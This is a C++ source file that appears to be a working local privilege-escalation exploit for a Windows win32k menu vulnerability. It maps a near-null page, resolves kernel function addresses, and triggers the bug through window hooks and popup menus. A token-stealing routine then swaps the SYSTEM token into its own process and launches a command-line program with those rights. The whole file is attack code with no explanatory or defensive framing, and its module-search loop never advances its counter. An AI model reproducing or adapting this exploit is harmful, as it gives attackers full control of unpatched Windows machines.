// Test.cpp : Defines the entry point for the console application.
//

#include <stdio.h>
#include <Windows.h>

#define PTR_SIZE sizeof(UINT_PTR)
#define MN_FINDMENUWINDOWFROMPOINT 0x1EB
#define SystemModuleInformation	11

typedef NTSTATUS(NTAPI *kNtAllocateVirtualMemory)(
	IN  HANDLE  ProcessHandle,
	IN  PVOID   *BaseAddress,
	IN  PULONG  ZeroBits,
	IN  PSIZE_T RegionSize,
	IN  ULONG   AllocationType,
	IN  ULONG   Protect
	);

typedef NTSTATUS(NTAPI *kZwQuerySystemInformation)(
	_In_       DWORD SystemInformationClass,
	_Inout_    PVOID SystemInformation,
	_In_       ULONG SystemInformationLength,
	_Out_opt_  PULONG ReturnLength
	);

typedef NTSTATUS(NTAPI *kPsLookupProcessByProcessId)(
	IN   HANDLE ProcessId,
	OUT  PVOID Process
	);

typedef PACCESS_TOKEN(NTAPI *kPsReferencePrimaryToken)(
	_Inout_  PVOID Process
	);


typedef struct _SYSTEM_MODULE
{
	HANDLE               Reserved1;
	PVOID                Reserved2;
	PVOID                ImageBaseAddress;
	ULONG                ImageSize;
	ULONG                Flags;
	USHORT               Id;
	USHORT               Rank;
	USHORT               w018;
	USHORT               NameOffset;
	BYTE                 Name[256];
} SYSTEM_MODULE, *PSYSTEM_MODULE;

typedef struct _SYSTEM_MODULE_INFORMATION
{
	ULONG                ModulesCount;
	SYSTEM_MODULE        Modules[0];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

typedef struct _FAKE_EPROCESS
{
	PACCESS_TOKEN				Token;
} FAKE_EPROCESS, *PFAKE_EPROCESS;

kPsLookupProcessByProcessId pPsLookupProcessByProcessId = NULL;
kPsReferencePrimaryToken pPsReferencePrimaryToken = NULL;
DWORD dwMyProcessId = 0;

long CALLBACK HookCallbackTwo(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)
{
	//printf("Callback two called.\n");
	EndMenu();
	return -5;
}

LRESULT CALLBACK HookCallback(int code, WPARAM wParam, LPARAM lParam) {
	//printf("Callback one called.\n");
		if (*(DWORD *)(lParam + PTR_SIZE * 2) == MN_FINDMENUWINDOWFROMPOINT) {
		if (UnhookWindowsHook(WH_CALLWNDPROC, HookCallback)) {
			SetWindowLongPtrA(*(HWND *)(lParam + PTR_SIZE * 3), GWLP_WNDPROC, (ULONG_PTR)HookCallbackTwo);
		}
	}
	return CallNextHookEx(0, code, wParam, lParam);
}


LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {

	//printf("WindProc called with message=%d\n", msg);
	if (msg == WM_ENTERIDLE) {
		PostMessageA(hwnd, WM_KEYDOWN, VK_DOWN, 0);
		PostMessageA(hwnd, WM_KEYDOWN, VK_RIGHT, 0);
		PostMessageA(hwnd, WM_LBUTTONDOWN, 0, 0);
		//printf("PPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPOST!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n");
	}
	//Just pass any other messages to the default window procedure
	return DefWindowProc(hwnd, msg, wParam, lParam);
}



INT64 GetPTI() {
	PBYTE pTeb = (PBYTE)__readgsqword(0x30);
	return (INT64)*((PINT64)(pTeb + 0x78));
}

int __stdcall TokenStealingShellcodeWin7(int one, int two, int three, int four) {
	void* CurrentEPROCESS = NULL;
	void* SystemEPROCESS = NULL;
	PACCESS_TOKEN CurrentToken;
	PACCESS_TOKEN SystemToken;
	pPsLookupProcessByProcessId((HANDLE)dwMyProcessId, &CurrentEPROCESS);
	pPsLookupProcessByProcessId((HANDLE)4, &SystemEPROCESS);
	CurrentToken = pPsReferencePrimaryToken(CurrentEPROCESS);
	SystemToken = pPsReferencePrimaryToken(SystemEPROCESS);

	
	void* token_loc = (void *)((INT64)CurrentEPROCESS+0x208);
	*(PDWORD_PTR)token_loc = (_int64)SystemToken;

	return 0;
}

void main(char* argc, char* argv[])
{
	char szNtName[256];
	//存放Name的值
	PVOID NtBase;
	//存放ImageBaseAddress
	HMODULE hNtdll = LoadLibraryA("ntdll");
	if (hNtdll == NULL) {
		printf("Failed to load ntdll");
		return;
	}

	kNtAllocateVirtualMemory pNtAllocateVirtualMemory = (kNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
	if (pNtAllocateVirtualMemory == NULL) {
		printf("Failed to resolve NtAllocateVirtualMemory.\n");
		return;
	}

	dwMyProcessId = GetCurrentProcessId();

	_int64 base_address = 0x00000000fffffffb;
	SIZE_T region_size = 0x1000;

	NTSTATUS tmp = pNtAllocateVirtualMemory(
		GetCurrentProcess(),
		(LPVOID*)(&base_address),
		0,
		&region_size, 
		(MEM_RESERVE | MEM_COMMIT| MEM_TOP_DOWN),
		PAGE_EXECUTE_READWRITE 
	);

	if (tmp != (NTSTATUS)0x0) {
		printf("Failed to allocate null page.\n");
		return;
	}


	kZwQuerySystemInformation pZwQuerySystemInformation = (kZwQuerySystemInformation)GetProcAddress(hNtdll, "ZwQuerySystemInformation");
	//从ntdll中提取出ZwQuerySystemInformation
	if (pZwQuerySystemInformation == NULL)
	{
		printf("[-] Can not found ZwQuerySystemInformation!");
		return;
	}

	ULONG SystemInfoBufferSize;
	pZwQuerySystemInformation(SystemModuleInformation, &SystemInfoBufferSize, 0, &SystemInfoBufferSize);
	if (SystemInfoBufferSize == 0)
	{
		printf("[-] SystemInfoBufferSize is 0!");
	}
	PULONG pSystemInfoBuffer = (PULONG)LocalAlloc(LMEM_ZEROINIT, SystemInfoBufferSize);
	printf("[+] LocalAlloc:0x%p\n", pSystemInfoBuffer);
	if (pSystemInfoBuffer == 0)
	{
		printf("[-] LocalAlloc is fail!");
		return;
	}
	int ret = pZwQuerySystemInformation(SystemModuleInformation, pSystemInfoBuffer, SystemInfoBufferSize, &SystemInfoBufferSize);
	if (ret)
	{
		printf("[-] ZwQuerySystemInformation is fail!");
		return;
	}

	_SYSTEM_MODULE_INFORMATION* smi = (_SYSTEM_MODULE_INFORMATION *)pSystemInfoBuffer;

	printf("[+] Kernel Modle found %d\n", smi->ModulesCount);

	memset(szNtName, 0, 256);			//内存清零
	int i = 0;
	while (i < smi->ModulesCount)
	{
		SYSTEM_MODULE* sm = (SYSTEM_MODULE *)(smi->Modules + i);
		
		if (strstr((char*)sm->Name, ".exe") && strstr((char*)sm->Name, "nt"))
		{
			NtBase = sm->ImageBaseAddress;
			strncpy_s(szNtName, 256, strstr((char*)sm->Name, "nt"), _TRUNCATE);
			break;
		}

	}
	HMODULE nt = LoadLibraryA(szNtName);
	kPsLookupProcessByProcessId PLPBP = (kPsLookupProcessByProcessId)GetProcAddress(nt, "PsLookupProcessByProcessId");

	pPsLookupProcessByProcessId = (kPsLookupProcessByProcessId)((_int64)NtBase + ((_int64)PLPBP - (_int64)nt));
	printf("[+] PsLookupProcessByProcessId Address in 0x%p\n", pPsLookupProcessByProcessId);

	kPsReferencePrimaryToken PRPT = (kPsReferencePrimaryToken)GetProcAddress(nt, "PsReferencePrimaryToken");

	pPsReferencePrimaryToken = (kPsReferencePrimaryToken)((_int64)NtBase + ((_int64)PRPT - (_int64)nt));
	printf("[+] PsReferencePrimaryToken Address in 0x%p\n", pPsReferencePrimaryToken);








	void* pti_loc = (void *)0x10000000B;
	void* check_loc = (void *)0x100000025;
	void* shellcode_loc = (void *)0x10000008B;
	*(PDWORD_PTR)pti_loc = GetPTI();
	*(LPBYTE)check_loc = 0x4;
	*(PDWORD_PTR)shellcode_loc = (_int64)TokenStealingShellcodeWin7;

	WNDCLASSA wnd_class = { 0 };
	wnd_class.lpfnWndProc = WndProc;
	wnd_class.hInstance = GetModuleHandle(NULL);
	wnd_class.lpszClassName = "abcde";

	ATOM reg = RegisterClassA(&wnd_class);
	if (reg == NULL) {
		printf("Failed to register window class.\n");
		return;
	}


	HWND main_wnd = CreateWindowA(wnd_class.lpszClassName, "", WS_OVERLAPPEDWINDOW | WS_VISIBLE, 0, 0, 0, 0, NULL, NULL, wnd_class.hInstance, NULL);

	if (main_wnd == NULL) {
		printf("Failed to create window instance.\n");
		return;
	}

	HMENU MenuOne = CreatePopupMenu();

	if (MenuOne == NULL) {
		printf("Failed to create popup menu one.\n");
		return;
	}

	MENUITEMINFOA MenuOneInfo = { 0 };
	MenuOneInfo.cbSize = sizeof(MENUITEMINFOA);
	MenuOneInfo.fMask = MIIM_STRING;

	BOOL insertMenuItem = InsertMenuItemA(MenuOne, 0, TRUE, &MenuOneInfo);

	if (!insertMenuItem) {
		printf("Failed to insert popup menu one.\n");
		DestroyMenu(MenuOne);
		return;
	}

	HMENU MenuTwo = CreatePopupMenu();

	if (MenuTwo == NULL) {
		printf("Failed to create menu two.\n");
		DestroyMenu(MenuOne);
		return;
	}

	MENUITEMINFOA MenuTwoInfo = { 0 };
	MenuTwoInfo.cbSize = sizeof(MENUITEMINFOA);
	MenuTwoInfo.fMask = (MIIM_STRING | MIIM_SUBMENU);
	MenuTwoInfo.hSubMenu = MenuOne;
	MenuTwoInfo.dwTypeData = "";
	MenuTwoInfo.cch = 1;
	insertMenuItem = InsertMenuItemA(MenuTwo, 0, TRUE, &MenuTwoInfo);

	if (!insertMenuItem) {
		printf("Failed to insert second pop-up menu.\n");
		DestroyMenu(MenuOne);
		DestroyMenu(MenuTwo);
		return;
	}


	HHOOK setWindowsHook = SetWindowsHookExA(WH_CALLWNDPROC, HookCallback, NULL, GetCurrentThreadId());

	if (setWindowsHook == NULL) {
		printf("Failed to insert call back one.\n");
		DestroyMenu(MenuOne);
		DestroyMenu(MenuTwo);
		return;
	}


	TrackPopupMenu(
		MenuTwo, //Handle to the menu we want to display, for us its the submenu we just created.
		0, //Options on how the menu is aligned, what clicks are allowed etc, we don't care.
		0, //Horizontal position - left hand side
		0, //Vertical position - Top edge
		0, //Reserved field, has to be 0
		main_wnd, //Handle to the Window which owns the menu
		NULL //This value is always ignored...
	);

	DestroyWindow(main_wnd);

	STARTUPINFOA si;
	PROCESS_INFORMATION pi;

	if (argv[1]) 
	{
		si = { 0 };
		pi = { 0 };
		si.cb = sizeof(si);
		si.dwFlags = 1;
		si.wShowWindow = 0;
		CreateProcessA(NULL, argv[1], NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
		WaitForSingleObject(pi.hProcess, 0x10000);
	}
	
}